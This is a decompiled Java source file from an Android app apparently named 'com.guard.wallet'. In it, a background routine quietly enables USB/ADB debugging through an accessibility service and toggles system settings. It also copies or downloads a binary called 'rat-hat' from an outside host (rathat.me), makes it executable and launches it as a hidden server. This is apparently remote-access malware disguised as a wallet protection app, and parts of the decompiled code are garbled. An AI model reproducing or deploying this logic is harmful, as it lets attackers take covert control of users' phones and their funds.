package p005h;

import a1.AbstractC0026q;
import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import com.guard.wallet.entity.CheckPortResult;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0248d;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.locks.ReentrantLock;
import p006i.C0328a;

/* renamed from: h.a */
/* loaded from: classes.dex */
public final /* synthetic */ class RunnableC0314a implements Runnable {

    /* renamed from: a */
    public final /* synthetic */ int f590a;

    /* renamed from: b */
    public final /* synthetic */ C0318e f591b;

    public /* synthetic */ RunnableC0314a(C0318e c0318e, int i2) {
        this.f590a = i2;
        this.f591b = c0318e;
    }

    /* JADX WARN: Code restructure failed: missing block: B:38:0x00b3, code lost:
    
        if (r0.isConnected() != false) goto L87;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:193:0x039d  */
    /* JADX WARN: Removed duplicated region for block: B:220:0x0404  */
    /* JADX WARN: Removed duplicated region for block: B:55:0x010a  */
    /* JADX WARN: Removed duplicated region for block: B:67:0x012f  */
    /* JADX WARN: Removed duplicated region for block: B:68:0x00f6 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:90:0x015f  */
    @Override // java.lang.Runnable
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void run() {
        boolean z2;
        CheckPortResult checkPortResult;
        CheckPortResult m854M;
        boolean z3;
        boolean z4;
        int i2;
        int i3 = this.f590a;
        boolean z5 = true;
        char c = 1;
        C0318e c0318e = this.f591b;
        int i4 = 0;
        Object[] objArr = 0;
        switch (i3) {
            case 0:
                AtomicBoolean atomicBoolean = c0318e.f615m;
                boolean z6 = atomicBoolean.get();
                AtomicInteger atomicInteger = c0318e.f616n;
                if (z6) {
                    atomicInteger.set(0);
                } else if (atomicInteger.get() < 12) {
                    atomicInteger.set(atomicInteger.get() + 1);
                    break;
                } else {
                    atomicBoolean.set(true);
                }
                if (!c0318e.f621s.get() && !MyAccessibilityService.f322r.get()) {
                    c0318e.f618p.submit(MyAccessibilityService.m554P() == null ? new RunnableC0314a(c0318e, z5 ? 1 : 0) : new RunnableC0314a(c0318e, 2));
                }
                if (c0318e.m860U()) {
                    boolean mo302D = c0318e.mo302D();
                    AtomicInteger atomicInteger2 = c0318e.f627y;
                    ReentrantLock reentrantLock = c0318e.f612j;
                    Integer num = C0318e.f605E;
                    if (!mo302D) {
                        Integer m698b = AbstractC0252h.m698b();
                        if (m698b.intValue() > 0 && reentrantLock.tryLock()) {
                            CheckPortResult m851J = c0318e.m851J(m698b.intValue());
                            reentrantLock.unlock();
                            if (m851J != null) {
                                break;
                            }
                        }
                        Context context = c0318e.f611i;
                        if (context == null || c0318e.mo301C() == null || c0318e.mo300B() == null || !reentrantLock.tryLock()) {
                            checkPortResult = null;
                        } else {
                            try {
                            } catch (Exception e2) {
                                e = e2;
                                z3 = false;
                            }
                            if (AbstractC0026q.m154E(num.intValue())) {
                                i2 = 0;
                                z4 = false;
                            } else {
                                z3 = c0318e.m307z(num.intValue());
                                if (z3) {
                                    try {
                                        z4 = z3;
                                        i2 = num.intValue();
                                    } catch (Exception e3) {
                                        e = e3;
                                        AbstractC0026q.m186s("AdbConnectionManager", e);
                                        z4 = z3;
                                        i2 = 0;
                                        if (!z4) {
                                        }
                                        if (z4) {
                                        }
                                        reentrantLock.unlock();
                                        if (checkPortResult != null) {
                                        }
                                        m854M.isConnected();
                                        if (!c0318e.mo302D()) {
                                        }
                                    }
                                }
                                z4 = z3;
                                i2 = 0;
                            }
                            if (!z4) {
                                try {
                                    if (Build.VERSION.SDK_INT >= 30) {
                                        i2 = c0318e.m305x(context);
                                        if (i2 > 0) {
                                            z4 = true;
                                        }
                                    }
                                } catch (Exception e4) {
                                    AbstractC0026q.m186s("AdbConnectionManager", e4);
                                }
                            }
                            if (z4) {
                                checkPortResult = null;
                            } else {
                                checkPortResult = new CheckPortResult();
                                checkPortResult.setConnected(true);
                                checkPortResult.setDebugPort(Integer.valueOf(i2));
                                checkPortResult.setConnectedDevice("com.guard.wallet");
                                AbstractC0252h.m720x(checkPortResult);
                                atomicInteger2.set(0);
                                c0318e.f623u.set(true);
                                c0318e.f624v.set(true);
                            }
                            reentrantLock.unlock();
                        }
                        if ((checkPortResult != null || !checkPortResult.isConnected()) && c0318e.m860U() && AbstractC0251g.m637J() && (m854M = c0318e.m854M()) != null) {
                            m854M.isConnected();
                        }
                    }
                    if (!c0318e.mo302D()) {
                        AtomicBoolean atomicBoolean2 = c0318e.f608B;
                        if (atomicBoolean2.get()) {
                            AbstractC0251g.m631D();
                            c0318e.m861V();
                            atomicBoolean2.set(false);
                        } else {
                            int m857P = c0318e.m857P("if [ -f /data/local/tmp/rat-hat ]; then echo \"File exists\"; else echo \"File does not exist\"; fi", new C0328a("File exists", z5, z5 ? 1 : 0), new C0328a("File does not exist", z5, z5 ? 1 : 0));
                            if (m857P == 1) {
                                AbstractC0252h.m722z(true);
                                int m857P2 = c0318e.m857P("ps -ef | grep rat-hat", new C0328a("rat-hat server -d", z5, i4), new C0328a("grep rat-hat", objArr == true ? 1 : 0, z5 ? 1 : 0));
                                if ((m857P2 == 1 || !(m857P2 == 0 || AbstractC0026q.m154E(7912))) == true) {
                                    AbstractC0251g.m631D();
                                    c0318e.m861V();
                                } else {
                                    c0318e.m856O("nohup /data/local/tmp/rat-hat server -d > /dev/null &");
                                }
                            } else if (m857P == 0) {
                                AbstractC0252h.m722z(false);
                                String y02 = AbstractC0251g.y0();
                                if (!AbstractC0026q.m151B(y02)) {
                                    String concat = y02.concat("/").concat("librat-hat.so");
                                    if (AbstractC0026q.m190w(concat)) {
                                        String concat2 = "/data/local/tmp/".concat("rat-hat");
                                        String concat3 = "cp".concat(" -f ").concat(concat).concat(" ").concat(concat2);
                                        String concat4 = "chmod".concat(" ").concat("777").concat(" ").concat(concat2);
                                        if (c0318e.m855N(concat3) && c0318e.m855N(concat4)) {
                                            AbstractC0252h.m722z(true);
                                        }
                                    }
                                }
                                String[] strArr = Build.SUPPORTED_ABIS;
                                String str = (strArr == null || strArr.length <= 0) ? "armeabi" : strArr[0];
                                String m605c = AbstractC0248d.m605c();
                                if (AbstractC0026q.m151B(m605c)) {
                                    m605c = "https://rathat.me/lib";
                                }
                                String m606d = AbstractC0248d.m606d();
                                if (AbstractC0026q.m151B(m606d)) {
                                    m606d = "rat-hat";
                                }
                                c0318e.m850I(null, m605c.concat("/").concat(str).concat("/").concat(m606d), "rat-hat", "nohup /data/local/tmp/rat-hat server -d > /dev/null &");
                            } else {
                                Log.d("AdbConnectionManager", "无法检测是否已安装RatHat");
                            }
                        }
                        Integer m698b2 = AbstractC0252h.m698b();
                        if (c0318e.mo302D()) {
                            boolean equals = Objects.equals(m698b2, num);
                            AtomicInteger atomicInteger3 = c0318e.f628z;
                            if (equals) {
                                atomicInteger3.set(0);
                                break;
                            } else {
                                int incrementAndGet = atomicInteger3.incrementAndGet();
                                if (incrementAndGet > 1 && incrementAndGet <= 5) {
                                    LinkedList linkedList = new LinkedList();
                                    int i5 = 0;
                                    linkedList.add(new C0328a("mtp", z5, i5));
                                    LinkedList linkedList2 = new LinkedList();
                                    linkedList2.add(new C0328a("ptp", z5, i5));
                                    linkedList2.add(new C0328a("rndis", z5, i5));
                                    linkedList2.add(new C0328a("midi", z5, i5));
                                    linkedList2.add(new C0328a("ncm", z5, i5));
                                    if (c0318e.m858Q("svc usb getFunctions", linkedList, linkedList2) == 0) {
                                        c0318e.m855N("svc usb setFunctions mtp");
                                    }
                                } else if (incrementAndGet > 5 && incrementAndGet <= 10) {
                                    if (!AbstractC0251g.m636I()) {
                                        if (!AbstractC0251g.p0() && MyAccessibilityService.m554P() != null && MyAccessibilityService.m554P().m565V()) {
                                            try {
                                            } catch (Exception e5) {
                                                AbstractC0026q.m186s("ApplicationUtil", e5);
                                            }
                                            if (AbstractC0251g.m653Z() != null && (Settings.System.canWrite(AbstractC0251g.m653Z()) || AbstractC0251g.m663j())) {
                                                Log.d("ApplicationUtil", "已有系统设置修改权限");
                                                Settings.Global.putInt(AbstractC0251g.m653Z().getContentResolver(), "adb_enabled", 1);
                                                if (AbstractC0251g.m636I()) {
                                                    Log.d("ApplicationUtil", "已有系统设置修改权限,开启USB调试成功");
                                                    if (c != 0) {
                                                    }
                                                }
                                            }
                                            c = 0;
                                            if (c != 0) {
                                            }
                                        }
                                        if (!AbstractC0251g.p0() && MyAccessibilityService.m554P() != null && MyAccessibilityService.m554P().m565V()) {
                                            Log.d("AdbConnectionManager", "无障碍服务监听窗口初始化已完成,准备开启ADB调试");
                                            AbstractC0207l.m428k("http://127.0.0.1:7911");
                                            break;
                                        } else {
                                            Log.d("AdbConnectionManager", "锁屏中、黑屏中、无障碍服务监听窗口初始化未完成");
                                            break;
                                        }
                                    }
                                } else {
                                    Log.d("AdbConnectionManager", "useDefaultPort ErrorCount:" + incrementAndGet);
                                }
                                if (AbstractC0251g.m636I()) {
                                    Log.d("AdbConnectionManager", "USE DEFAULT ADB PORT:" + num);
                                    String valueOf = String.valueOf(num);
                                    if (!AbstractC0026q.m151B(valueOf)) {
                                        try {
                                            c0318e.m303E(new String[]{valueOf}, 16).m317B(2000L);
                                            break;
                                        } catch (Exception e6) {
                                            AbstractC0026q.m186s("AdbConnectionManager", e6);
                                            return;
                                        }
                                    }
                                }
                            }
                        }
                    } else {
                        int incrementAndGet2 = atomicInteger2.incrementAndGet();
                        if (incrementAndGet2 > 0 && incrementAndGet2 <= 6) {
                            if (incrementAndGet2 % 3 == 0) {
                                c0318e.m854M();
                                break;
                            } else {
                                Integer m698b3 = AbstractC0252h.m698b();
                                if (m698b3.intValue() > 0 && reentrantLock.tryLock()) {
                                    c0318e.m851J(m698b3.intValue());
                                    reentrantLock.unlock();
                                    break;
                                }
                            }
                        } else {
                            try {
                            } catch (Exception e7) {
                                AbstractC0026q.m186s("ApplicationUtil", e7);
                            }
                            if (AbstractC0251g.m653Z() != null && (Settings.System.canWrite(AbstractC0251g.m653Z()) || AbstractC0251g.m663j())) {
                                Log.d("ApplicationUtil", "已有系统设置修改权限");
                                Settings.Global.putInt(AbstractC0251g.m653Z().getContentResolver(), "adb_wifi_enabled", 0);
                                if (!AbstractC0251g.m637J()) {
                                    Log.d("ApplicationUtil", "已有系统设置修改权限,关闭无线调试成功");
                                    if (!z5) {
                                        AbstractC0207l.m423f("http://127.0.0.1:7911");
                                    }
                                    atomicInteger2.set(0);
                                    break;
                                }
                            }
                            z5 = false;
                            if (!z5) {
                            }
                            atomicInteger2.set(0);
                        }
                    }
                }
                break;
            case 1:
                AtomicBoolean atomicBoolean3 = c0318e.f621s;
                atomicBoolean3.set(true);
                c0318e.f622t.set(0L);
                if (!AbstractC0251g.m639L() && !AbstractC0026q.m154E(7912)) {
                    AbstractC0207l.m440w();
                    AbstractC0251g.T0(25);
                }
                atomicBoolean3.set(false);
                break;
            default:
                AtomicBoolean atomicBoolean4 = c0318e.f621s;
                atomicBoolean4.set(true);
                long currentTimeMillis = System.currentTimeMillis();
                AtomicLong atomicLong = c0318e.f622t;
                if (atomicLong.get() != 0) {
                    long j2 = currentTimeMillis - atomicLong.get();
                    if (j2 > 60000) {
                        MyAccessibilityService m554P = MyAccessibilityService.m554P();
                        if (!(m554P.f310h.get() ? false : m554P.f311i.get())) {
                            if (j2 > 300000) {
                                atomicLong.set(currentTimeMillis);
                                z2 = false;
                                MyAccessibilityService.m554P().m559H(true, false);
                                atomicBoolean4.set(z2);
                                break;
                            }
                        } else if (!AbstractC0251g.m639L() && !AbstractC0026q.m154E(7912)) {
                            AbstractC0207l.m440w();
                            AbstractC0251g.T0(25);
                        }
                    }
                    z2 = false;
                    atomicBoolean4.set(z2);
                }
                atomicLong.set(currentTimeMillis);
                z2 = false;
                atomicBoolean4.set(z2);
                break;
        }
    }
}
